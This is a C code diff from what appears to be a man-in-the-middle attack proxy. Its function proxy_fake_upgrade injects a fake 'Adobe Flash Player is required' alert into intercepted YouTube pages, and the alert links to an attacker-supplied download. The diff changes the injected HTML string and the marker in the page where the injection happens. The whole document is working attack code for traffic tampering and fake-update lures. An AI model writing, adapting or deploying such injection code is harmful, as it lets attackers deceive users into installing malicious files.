@@ -77,7 +77,9 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
          DEBUG_MSG(D_INFO, "Substituting video frame...");
       
-         char *html_to_inject1 = "document.getElementById('watch-player').innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
+         //char *html_to_inject1 = "document.getElementById('watch-player').innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
+         //char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
+         char *html_to_inject1 = "\"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
          char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
          char *html_to_inject;
          int html_to_inject_len = 0;
@@ -92,7 +94,8 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
          strcat(html_to_inject, html_to_inject2);
 
          fbio = BIO_new(BIO_f_inject());
-         bis.search = "'watch-player').innerHTML = swf;";
+         //bis.search = "-player').innerHTML = swf;";
+         bis.search = "var swf = ";
          bis.inject = html_to_inject;
          bis.inject_len = html_to_inject_len;
 
